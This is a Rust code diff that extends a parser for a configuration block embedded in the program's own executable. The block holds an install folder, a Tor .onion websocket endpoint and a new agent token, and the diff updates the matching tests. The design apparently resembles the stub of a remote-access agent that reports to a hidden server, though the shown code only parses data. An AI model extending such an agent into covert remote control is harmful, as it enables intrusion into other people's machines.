@@ -12,13 +12,15 @@ use crate::transport::Endpoint;
 //   [3..3+folder_name_len]  folder_name: UTF-8
 //   then:   onion_len: u16 little-endian
 //   then:   onion: UTF-8
+//   then:   agent_token_len: u16
+//   then:   agent_token: UTF-8
 
 const MAGIC: &[u8; 8] = b"VLHCFG\x00\x01";
 const BLOCK_SEARCH_MAX: usize = 64 * 1024 * 1024; // only scan first 64 MiB
 
 // Default values used when a config block cannot be located (development / test builds).
 const DEFAULT_ONION: &str = "";
-const DEFAULT_FOLDER: &str = "Valhalla";
+const DEFAULT_FOLDER: &str = "Einherjar";
 
 #[derive(Clone, Debug)]
 pub enum InstallDir {
@@ -57,11 +59,12 @@ pub struct Config {
     pub install_dir: InstallDir,
     pub folder_name: String,
     pub onion: String,
+    pub agent_token: String,
 }
 
 /// Read configuration from the running executable image.
-/// Returns (Endpoint, display_string, InstallDir, folder_name).
-pub(crate) fn load_config() -> Result<(Endpoint, String, InstallDir, String), String> {
+/// Returns (Endpoint, display_string, InstallDir, folder_name, agent_token).
+pub(crate) fn load_config() -> Result<(Endpoint, String, InstallDir, String, String), String> {
     let exe = std::env::current_exe()
         .map_err(|_| String::new())?;
     let bytes = fs::read(&exe)
@@ -71,6 +74,7 @@ pub(crate) fn load_config() -> Result<(Endpoint, String, InstallDir, String), St
         install_dir: InstallDir::Local,
         folder_name: DEFAULT_FOLDER.to_owned(),
         onion: DEFAULT_ONION.to_owned(),
+        agent_token: String::new(),
     });
 
     if cfg.onion.is_empty() {
@@ -80,14 +84,17 @@ pub(crate) fn load_config() -> Result<(Endpoint, String, InstallDir, String), St
     let endpoint = Endpoint::parse(&cfg.onion)
         .map_err(|_| String::new())?;
     let display = cfg.onion.clone();
-    Ok((endpoint, display, cfg.install_dir, cfg.folder_name))
+    if cfg.agent_token.is_empty() {
+        return Err(String::new());
+    }
+    Ok((endpoint, display, cfg.install_dir, cfg.folder_name, cfg.agent_token))
 }
 
 /// Read only the connection endpoint from the embedded stub configuration.
 /// This is used by the update probe, which must operate before the normal
 /// argument/data-directory initialization performed by `args::get()`.
 pub(crate) fn load_endpoint() -> Result<(Endpoint, String), String> {
-    let (endpoint, display, _install_dir, _folder_name) = load_config()?;
+    let (endpoint, display, _install_dir, _folder_name, _agent_token) = load_config()?;
     Ok((endpoint, display))
 }
 
@@ -115,8 +122,15 @@ fn parse_config(bytes: &[u8]) -> Option<Config> {
     if onion_len > 512 { return None; }
     let onion_bytes = bytes.get(cursor..cursor + onion_len)?;
     let onion = std::str::from_utf8(onion_bytes).ok()?.trim().to_owned();
+    cursor += onion_len;
 
-    Some(Config { install_dir, folder_name, onion })
+    let agent_token_len = read_u16_le(bytes, cursor)? as usize;
+    cursor += 2;
+    if agent_token_len > 256 { return None; }
+    let token_bytes = bytes.get(cursor..cursor + agent_token_len)?;
+    let agent_token = std::str::from_utf8(token_bytes).ok()?.trim().to_owned();
+
+    Some(Config { install_dir, folder_name, onion, agent_token })
 }
 
 fn read_u16_le(bytes: &[u8], pos: usize) -> Option<u16> {
@@ -129,7 +143,7 @@ fn read_u16_le(bytes: &[u8], pos: usize) -> Option<u16> {
 mod tests {
     use super::*;
 
-    fn make_block(dir: u8, folder: &str, onion: &str) -> Vec<u8> {
+    fn make_block(dir: u8, folder: &str, onion: &str, token: &str) -> Vec<u8> {
         let mut v = MAGIC.to_vec();
         v.push(dir);
         let fb = folder.as_bytes();
@@ -140,22 +154,26 @@ mod tests {
         v.push(ob.len() as u8);
         v.push(0);
         v.extend_from_slice(ob);
+        let tb = token.as_bytes();
+        v.extend_from_slice(&(tb.len() as u16).to_le_bytes());
+        v.extend_from_slice(tb);
         v
     }
 
     #[test]
     fn parse_valid_block() {
-        let block = make_block(1, "Valhalla", "ws://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion:443/");
+        let block = make_block(1, "Einherjar", "ws://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion:443/", "token");
         let cfg = parse_config(&block).expect("should parse");
         assert!(matches!(cfg.install_dir, InstallDir::Local));
-        assert_eq!(cfg.folder_name, "Valhalla");
+        assert_eq!(cfg.folder_name, "Einherjar");
         assert!(cfg.onion.contains(".onion"));
+        assert_eq!(cfg.agent_token, "token");
     }
 
     #[test]
     fn parse_block_embedded_in_larger_payload() {
         let mut data = vec![0u8; 1024];
-        let block = make_block(2, "Vikings", "ws://bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.onion:443/valhalla");
+        let block = make_block(2, "Vikings", "ws://bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.onion:443/valhalla", "token");
         data[512..512 + block.len()].copy_from_slice(&block);
         let cfg = parse_config(&data).expect("should find block");
         assert!(matches!(cfg.install_dir, InstallDir::Temp));
